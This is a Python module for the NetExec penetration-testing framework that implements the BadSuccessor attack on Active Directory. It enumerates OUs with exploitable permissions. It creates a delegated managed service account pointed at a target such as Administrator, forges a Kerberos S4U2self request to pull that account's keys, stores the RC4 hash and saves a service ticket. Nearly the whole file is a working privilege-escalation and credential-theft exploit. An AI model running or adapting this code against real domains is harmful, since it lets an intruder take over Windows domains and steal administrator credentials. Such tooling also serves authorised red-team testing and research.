import datetime
import os
import random
from binascii import hexlify

from pyasn1.codec.der import decoder, encoder
from pyasn1.error import PyAsn1Error
from pyasn1.type.univ import noValue
from pyasn1.type import tag

from impacket.ldap import ldaptypes
from impacket.ldap.ldapasn1 import SDFlagsControl
from impacket.ldap.ldap import LDAPSessionError
from impacket.krb5.kerberosv5 import KerberosError, sendReceive
from impacket.krb5.asn1 import AP_REQ, AS_REP, TGS_REQ, Authenticator, TGS_REP, seq_set, seq_set_iter, PA_S4U_X509_USER, EncTGSRepPart, KERB_DMSA_KEY_PACKAGE, S4UUserID
from impacket.krb5.ccache import CCache
from impacket.krb5.crypto import _enctype_table, _get_checksum_profile, Cksumtype, InvalidChecksum
from impacket.krb5 import constants
from impacket.krb5.constants import encodeFlags, ApplicationTagNumbers
from impacket.krb5.types import Principal, KerberosTime, Ticket
from impacket.uuid import bin_to_string

from nxc.helpers.misc import CATEGORY, gen_random_string
from nxc.parsers.ldap_results import parse_result_attributes
from nxc.paths import NXC_PATH
from nxc.protocols.ldap.kerberos import KerberosAttacks

RELEVANT_OBJECT_TYPES = {
    "00000000-0000-0000-0000-000000000000": "All Objects",
    "0feb936f-47b3-49f2-9386-1dedc2c23765": "msDS-DelegatedManagedServiceAccount",
}

EXCLUDED_SIDS_SUFFIXES = ["-512", "-519"]  # Domain Admins, Enterprise Admins
EXCLUDED_SIDS = ["S-1-5-32-544", "S-1-5-18"]  # Builtin Administrators, Local SYSTEM

ACCESS_RIGHTS = {
    # Generic Rights
    "GenericRead": 0x80000000,  # ADS_RIGHT_GENERIC_READ
    "GenericWrite": 0x40000000,  # ADS_RIGHT_GENERIC_WRITE
    "GenericExecute": 0x20000000,  # ADS_RIGHT_GENERIC_EXECUTE
    "GenericAll": 0x10000000,  # ADS_RIGHT_GENERIC_ALL

    # Maximum Allowed access type
    "MaximumAllowed": 0x02000000,

    # Access System Acl access type
    "AccessSystemSecurity": 0x01000000,  # ADS_RIGHT_ACCESS_SYSTEM_SECURITY

    # Standard access types
    "Synchronize": 0x00100000,  # ADS_RIGHT_SYNCHRONIZE
    "WriteOwner": 0x00080000,  # ADS_RIGHT_WRITE_OWNER
    "WriteDACL": 0x00040000,  # ADS_RIGHT_WRITE_DAC
    "ReadControl": 0x00020000,  # ADS_RIGHT_READ_CONTROL
    "Delete": 0x00010000,  # ADS_RIGHT_DELETE

    # Specific rights
    "AllExtendedRights": 0x00000100,  # ADS_RIGHT_DS_CONTROL_ACCESS
    "ListObject": 0x00000080,  # ADS_RIGHT_DS_LIST_OBJECT
    "DeleteTree": 0x00000040,  # ADS_RIGHT_DS_DELETE_TREE
    "WriteProperties": 0x00000020,  # ADS_RIGHT_DS_WRITE_PROP
    "ReadProperties": 0x00000010,  # ADS_RIGHT_DS_READ_PROP
    "Self": 0x00000008,  # ADS_RIGHT_DS_SELF
    "ListChildObjects": 0x00000004,  # ADS_RIGHT_ACTRL_DS_LIST
    "DeleteChild": 0x00000002,  # ADS_RIGHT_DS_DELETE_CHILD
    "CreateChild": 0x00000001,  # ADS_RIGHT_DS_CREATE_CHILD
}

RELEVANT_RIGHTS = {
    "GenericAll": ACCESS_RIGHTS["GenericAll"],
    "GenericWrite": ACCESS_RIGHTS["GenericWrite"],
    "WriteOwner": ACCESS_RIGHTS["WriteOwner"],
    "WriteDACL": ACCESS_RIGHTS["WriteDACL"],
    "CreateChild": ACCESS_RIGHTS["CreateChild"],
    "WriteProperties": ACCESS_RIGHTS["WriteProperties"],
    "AllExtendedRights": ACCESS_RIGHTS["AllExtendedRights"]
}


class NXCModule:
    """
    -------
    Module by @mpgn based on https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory#credentials
    and https://raw.githubusercontent.com/akamai/BadSuccessor/refs/heads/main/Get-BadSuccessorOUPermissions.ps1
    Exploit functionality based on impacket badsuccessor.py and getST.py dMSA support.
    """

    name = "badsuccessor"
    description = "Check and exploit the bad successor attack (DMSA)"
    supported_protocols = ["ldap"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.connection = None
        self.target_ou = None
        self.target_account = None
        self.dmsa_name = None
        self.delete = False
        self.valid_options = True
        self.domain_sid = None

    def options(self, context, module_options):
        """
        Without options the module enumerates OUs vulnerable to BadSuccessor.
        Provide TARGET_OU to create a dMSA, retrieve the superseded account keys, and save a .ccache ticket.

        TARGET_OU       DN of the OU where the dMSA will be created (triggers exploit mode)
        TARGET_ACCOUNT  sAMAccountName of the account to impersonate via migration (default: Administrator)
        DMSA_NAME       Name for the new dMSA object (default: auto-generated dMSA-XXXXXXXX)
        DELETE          Delete an existing dMSA instead of creating one, requires DMSA_NAME and TARGET_OU

        Examples:
            nxc ldap <ip> -u user -p pass -M badsuccessor
            nxc ldap <ip> -u user -p pass -M badsuccessor -o TARGET_OU='OU=srv,DC=domain,DC=local'
            nxc ldap <ip> -u user -p pass -M badsuccessor -o TARGET_OU='OU=srv,DC=domain,DC=local' TARGET_ACCOUNT=DC01$
            nxc ldap <ip> -u user -p pass -M badsuccessor -o TARGET_OU='OU=srv,DC=domain,DC=local' DMSA_NAME=DMSA DELETE=True
        """
        self.context = context
        self.module_options = module_options
        self.target_ou = module_options.get("TARGET_OU")
        self.target_account = module_options.get("TARGET_ACCOUNT", "Administrator")
        self.dmsa_name = module_options.get("DMSA_NAME")
        self.delete = "DELETE" in module_options

        if self.dmsa_name:
            self.dmsa_name = self.dmsa_name.rstrip("$")
        if self.delete and not (self.dmsa_name and self.target_ou):
            context.log.fail("DELETE requires both DMSA_NAME and TARGET_OU")
            self.valid_options = False

    def get_domain_sid(self):
        parsed = parse_result_attributes(self.connection.search(searchFilter="(objectClass=domain)", attributes=["objectSid"]))
        return parsed[0]["objectSid"] if parsed and "objectSid" in parsed[0] else None

    def resolve_sid_to_name(self, sid):
        parsed = parse_result_attributes(self.connection.search(searchFilter=f"(objectSid={sid})", attributes=["sAMAccountName"]))
        return parsed[0]["sAMAccountName"] if parsed and "sAMAccountName" in parsed[0] else sid

    def resolve_account_dn(self, sam):
        parsed = parse_result_attributes(self.connection.search(searchFilter=f"(&(objectClass=*)(sAMAccountName={sam}))", attributes=["distinguishedName", "objectClass"]))
        if not parsed:
            return None
        for entry in parsed:
            oc = entry.get("objectClass", [])
            if isinstance(oc, str):
                oc = [oc]
            if any(c.lower() in ("user", "computer") for c in oc):
                return entry["distinguishedName"]
        return parsed[0]["distinguishedName"]

    def get_user_sid(self, username):
        parsed = parse_result_attributes(self.connection.search(searchFilter=f"(&(objectClass=user)(sAMAccountName={username}))", attributes=["objectSid"]))
        return parsed[0]["objectSid"] if parsed and "objectSid" in parsed[0] else None

    def is_excluded_sid(self, sid):
        if sid in EXCLUDED_SIDS:
            return True
        if not self.domain_sid:
            return False
        return any(sid.startswith(self.domain_sid) and sid.endswith(s) for s in EXCLUDED_SIDS_SUFFIXES)

    @staticmethod
    def build_gmsa_sd(sid_string):
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
        sd["Revision"] = b"\x01"
        sd["Sbz1"] = b"\x00"
        sd["Control"] = 32772  # SE_SELF_RELATIVE | SE_DACL_PRESENT
        sd["OwnerSid"] = ldaptypes.LDAP_SID()
        sd["OwnerSid"].fromCanonical(sid_string)
        sd["GroupSid"] = b""
        sd["Sacl"] = b""

        acl = ldaptypes.ACL()
        acl["AclRevision"] = 4
        acl["Sbz1"] = 0
        acl["Sbz2"] = 0
        acl.aces = []

        for mask_value in (0x000F01FF, 0x10000000):  # FULL_CONTROL, GenericAll
            ace = ldaptypes.ACE()
            ace["AceType"] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
            ace["AceFlags"] = 0x00
            acedata = ldaptypes.ACCESS_ALLOWED_ACE()
            acedata["Mask"] = ldaptypes.ACCESS_MASK()
            acedata["Mask"]["Mask"] = mask_value
            acedata["Sid"] = ldaptypes.LDAP_SID()
            acedata["Sid"].fromCanonical(sid_string)
            ace["Ace"] = acedata
            acl.aces.append(ace)

        sd["Dacl"] = acl
        return sd.getData()

    def find_bad_successor_ous(self, entries):
        self.domain_sid = self.get_domain_sid()
        results = {}
        for entry in parse_result_attributes(entries):
            dn = entry["distinguishedName"]
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=entry["nTSecurityDescriptor"])

            for ace in sd["Dacl"]["Data"]:
                if ace["AceType"] not in (ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE, ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE):
                    continue
                if not any(int(ace["Ace"]["Mask"]["Mask"]) & v for v in RELEVANT_RIGHTS.values()):
                    continue
                # A missing ObjectType means the right applies to every class, dMSA included
                if ace["AceType"] == ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE and ace["Ace"]["ObjectTypeLen"] != 0 and bin_to_string(ace["Ace"]["ObjectType"]).lower() not in RELEVANT_OBJECT_TYPES:
                    continue
                sid = ace["Ace"]["Sid"].formatCanonical()
                if not self.is_excluded_sid(sid):
                    results.setdefault(sid, []).append(dn)

            owner = sd["OwnerSid"].formatCanonical()
            if not self.is_excluded_sid(owner):
                results.setdefault(owner, []).append(dn)
        return results

    def enumerate_ous(self):
        resp = self.connection.search(searchFilter="(objectClass=organizationalUnit)", attributes=["distinguishedName", "nTSecurityDescriptor"], searchControls=[SDFlagsControl(criticality=True, flags=0x07)])
        self.context.log.debug(f"Found {len(resp)} OUs")

        results = self.find_bad_successor_ous(resp)
        if not results:
            self.context.log.highlight("No vulnerable OU found")
            return

        self.context.log.success(f"Found {len(results)} identities with BadSuccessor privileges")
        for sid, ous in results.items():
            name = self.resolve_sid_to_name(sid)
            for ou in ous:
                self.context.log.highlight(f"{sid}, {ou}" if sid == name else f"{name} ({sid}), {ou}")

    def create_dmsa(self):
        if not self.dmsa_name:
            self.dmsa_name = f"dMSA-{gen_random_string(8)}"

        dmsa_dn = f"CN={self.dmsa_name},{self.target_ou}"

        target_dn = self.resolve_account_dn(self.target_account)
        if not target_dn:
            self.context.log.fail(f"Target account not found: {self.target_account}")
            return None

        user_sid = self.get_user_sid(self.connection.username)
        if not user_sid:
            self.context.log.fail(f"Could not resolve SID for current user: {self.connection.username}")
            return None

        sd_data = self.build_gmsa_sd(user_sid)
        dns_hostname = f"{self.dmsa_name.lower()}.{self.connection.domain}"

        try:
            self.connection.ldap_connection.add(
                dmsa_dn,
                ["msDS-DelegatedManagedServiceAccount"],
                {
                    "cn": self.dmsa_name,
                    "sAMAccountName": f"{self.dmsa_name}$",
                    "dNSHostName": dns_hostname,
                    "userAccountControl": 4096,  # WORKSTATION_TRUST_ACCOUNT
                    "msDS-ManagedPasswordInterval": 30,
                    "msDS-DelegatedMSAState": 2,  # migration marked completed, this is what makes the KDC hand out the superseded account keys
                    "msDS-SupportedEncryptionTypes": 28,  # RC4 + AES128 + AES256
                    "accountExpires": 9223372036854775807,  # never
                    "msDS-ManagedAccountPrecededByLink": target_dn,
                    "msDS-GroupMSAMembership": sd_data,
                    "nTSecurityDescriptor": sd_data,
                },
            )
        except LDAPSessionError as e:
            if "insufficientAccessRights" in str(e):
                self.context.log.fail(f"Insufficient rights to create a dMSA in {self.target_ou}")
            elif "entryAlreadyExists" in str(e):
                self.context.log.fail(f"dMSA '{self.dmsa_name}$' already exists at {dmsa_dn}")
            elif "noSuchObject" in str(e):
                self.context.log.fail(f"OU not found: {self.target_ou}")
            else:
                self.context.log.fail(f"Failed to create dMSA '{self.dmsa_name}': {e}")
            return None

        self.context.log.success(f"dMSA '{self.dmsa_name}$' created at {dmsa_dn}")
        self.context.log.highlight(f"DNS Hostname: {dns_hostname}")
        self.context.log.highlight("Migration state: 2 (completed)")
        self.context.log.highlight(f"Target account: {target_dn}")
        return dmsa_dn

    def delete_dmsa(self):
        dmsa_dn = f"CN={self.dmsa_name},{self.target_ou}"
        try:
            self.connection.ldap_connection.delete(dmsa_dn)
            self.context.log.success(f"dMSA '{self.dmsa_name}$' deleted ({dmsa_dn})")
        except LDAPSessionError as e:
            if "noSuchObject" in str(e):
                self.context.log.fail(f"dMSA '{self.dmsa_name}$' not found at {dmsa_dn}")
            elif "insufficientAccessRights" in str(e):
                self.context.log.fail(f"Insufficient rights to delete '{self.dmsa_name}$'")
            else:
                self.context.log.fail(f"Failed to delete dMSA '{self.dmsa_name}': {e}")

    def display_keys(self, keys, label, store=False):
        self.context.log.success(label)
        for k in keys:
            etype = constants.EncryptionTypes(int(k["keytype"]))
            key_value = hexlify(bytes(k["keyvalue"])).decode()
            self.context.log.highlight(f"{etype}: {key_value}")
            if store and etype == constants.EncryptionTypes.rc4_hmac:
                self.context.db.add_credential("hash", self.connection.domain, self.target_account, key_value)

    def save_ccache(self, tgs, session_key):
        output_dir = os.path.join(NXC_PATH, "modules", "badsuccessor")
        os.makedirs(output_dir, exist_ok=True)
        ccache_path = os.path.join(output_dir, f"{self.dmsa_name}$.ccache")
        try:
            ccache = CCache()
            ccache.fromTGS(tgs, session_key, session_key)
            ccache.saveFile(ccache_path)
        except OSError as e:
            self.context.log.fail(f"Failed to save ccache: {e}")
            return
        self.context.log.success(f"Service ticket saved to {ccache_path}")

    def do_s4u_dmsa(self):
        domain = self.connection.domain
        kdc_host = self.connection.host

        self.context.log.info("Requesting TGT...")
        try:
            tgt_data = KerberosAttacks(self.connection).get_tgt_kerberoasting(self.connection.use_kcache)
        except (KerberosError, OSError) as e:
            self.context.log.fail(f"Failed to get TGT: {e}")
            return
        if not tgt_data:
            self.context.log.fail(f"Failed to get TGT for {self.connection.username}")
            return

        cipher = tgt_data["cipher"]
        sessionKey = tgt_data["sessionKey"]
        decodedTGT = decoder.decode(tgt_data["KDC_REP"], asn1Spec=AS_REP())[0]
        ticket = Ticket()
        ticket.from_asn1(decodedTGT["ticket"])

        # AP-REQ for TGS
        apReq = AP_REQ()
        apReq["pvno"] = 5
        apReq["msg-type"] = int(constants.ApplicationTagNumbers.AP_REQ.value)
        apReq["ap-options"] = constants.encodeFlags([])
        seq_set(apReq, "ticket", ticket.to_asn1)

        authenticator = Authenticator()
        authenticator["authenticator-vno"] = 5
        authenticator["crealm"] = str(decodedTGT["crealm"])
        clientName = Principal()
        clientName.from_asn1(decodedTGT, "crealm", "cname")
        seq_set(authenticator, "cname", clientName.components_to_asn1)
        now = datetime.datetime.now(datetime.timezone.utc)
        authenticator["cusec"] = now.microsecond
        authenticator["ctime"] = KerberosTime.to_asn1(now)

        encodedAuth = encoder.encode(authenticator)
        encryptedAuth = cipher.encrypt(sessionKey, 7, encodedAuth, None)
        apReq["authenticator"] = noValue
        apReq["authenticator"]["etype"] = cipher.enctype
        apReq["authenticator"]["cipher"] = encryptedAuth
        encodedApReq = encoder.encode(apReq)

        # PA-S4U-X509-USER for dMSA impersonation
        dmsa_principal = Principal(f"{self.dmsa_name}$", type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        nonce_value = random.getrandbits(31)
        dmsa_flags = [2, 4]  # UNCONDITIONAL_DELEGATION | SIGN_REPLY
        encoded_flags = encodeFlags(dmsa_flags)

        s4uID = S4UUserID()
        s4uID.setComponentByName("nonce", nonce_value)
        seq_set(s4uID, "cname", dmsa_principal.components_to_asn1)
        s4uID.setComponentByName("crealm", domain)
        s4uID.setComponentByName("options", encoded_flags)

        checksum_profile = _get_checksum_profile(Cksumtype.SHA1_AES256)
        checkSum = checksum_profile.checksum(sessionKey, ApplicationTagNumbers.EncTGSRepPart.value, encoder.encode(s4uID))

        s4uID_tagged = S4UUserID().subtype(explicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatConstructed, 0))
        s4uID_tagged.setComponentByName("nonce", nonce_value)
        seq_set(s4uID_tagged, "cname", dmsa_principal.components_to_asn1)
        s4uID_tagged.setComponentByName("crealm", domain)
        s4uID_tagged.setComponentByName("options", encoded_flags)

        pa_s4u = PA_S4U_X509_USER()
        pa_s4u.setComponentByName("user-id", s4uID_tagged)
        pa_s4u["checksum"] = noValue
        pa_s4u["checksum"]["cksumtype"] = Cksumtype.SHA1_AES256
        pa_s4u["checksum"]["checksum"] = checkSum

        tgsReq = TGS_REQ()
        tgsReq["pvno"] = 5
        tgsReq["msg-type"] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
        tgsReq["padata"] = noValue
        tgsReq["padata"][0] = noValue
        tgsReq["padata"][0]["padata-type"] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgsReq["padata"][0]["padata-value"] = encodedApReq
        tgsReq["padata"][1] = noValue
        tgsReq["padata"][1]["padata-type"] = int(constants.PreAuthenticationDataTypes.PA_S4U_X509_USER.value)
        tgsReq["padata"][1]["padata-value"] = encoder.encode(pa_s4u)

        reqBody = seq_set(tgsReq, "req-body")
        reqBody["kdc-options"] = constants.encodeFlags([constants.KDCOptions.forwardable.value, constants.KDCOptions.renewable.value, constants.KDCOptions.canonicalize.value])
        serverName = Principal(f"krbtgt/{domain}", type=constants.PrincipalNameType.NT_SRV_INST.value)
        seq_set(reqBody, "sname", serverName.components_to_asn1)
        reqBody["realm"] = str(decodedTGT["crealm"])
        reqBody["till"] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
        reqBody["nonce"] = random.getrandbits(31)
        seq_set_iter(reqBody, "etype", (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))

        self.context.log.info("Requesting S4U2self with dMSA...")
        try:
            r = sendReceive(encoder.encode(tgsReq), domain, kdc_host)
        except (KerberosError, OSError) as e:
            self.context.log.fail(f"S4U2self request failed: {e}")
            return

        tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]
        try:
            rep_cipher = _enctype_table[int(tgs["enc-part"]["etype"])]
            plain = rep_cipher.decrypt(sessionKey, 8, tgs["enc-part"]["cipher"])
            enc_part = decoder.decode(plain, asn1Spec=EncTGSRepPart())[0]
        except (InvalidChecksum, PyAsn1Error, KeyError) as e:
            self.context.log.fail(f"Failed to decrypt the S4U2self reply: {e}")
            return

        if "encrypted_pa_data" not in enc_part or not enc_part["encrypted_pa_data"]:
            self.context.log.fail("No encrypted_pa_data — dMSA key package not present")
            return

        for pa in enc_part["encrypted_pa_data"]:
            if int(pa["padata-type"]) != constants.PreAuthenticationDataTypes.KERB_DMSA_KEY_PACKAGE.value:
                continue
            pkg = decoder.decode(pa["padata-value"], asn1Spec=KERB_DMSA_KEY_PACKAGE())[0]
            self.display_keys(pkg["current-keys"], "Current keys:", store=True)
            self.display_keys(pkg["previous-keys"], "Previous keys:")
            break
        else:
            self.context.log.fail("KERB_DMSA_KEY_PACKAGE not found in response")
            return

        self.save_ccache(r, sessionKey)

    def check_dc_2025(self):
        resp = self.connection.search(searchFilter="(&(objectCategory=computer)(primaryGroupId=516))", attributes=["operatingSystem", "dNSHostName"])
        for dc in parse_result_attributes(resp):
            if "2025" not in dc.get("operatingSystem", ""):
                continue
            out = self.connection.resolver(dc["dNSHostName"])
            self.context.log.success(f"Found DC with Windows Server 2025: {out['host'] if out else 'Unknown IP'} ({dc['dNSHostName']})")
            return True

        self.context.log.fail("No DC with Windows Server 2025 found, attack may not be possible")
        return False

    def on_login(self, context, connection):
        self.context = context
        self.connection = connection
        if not self.valid_options or not self.check_dc_2025():
            return

        if self.delete:
            self.delete_dmsa()
        elif self.target_ou:
            if self.create_dmsa():
                self.do_s4u_dmsa()
        else:
            self.enumerate_ous()
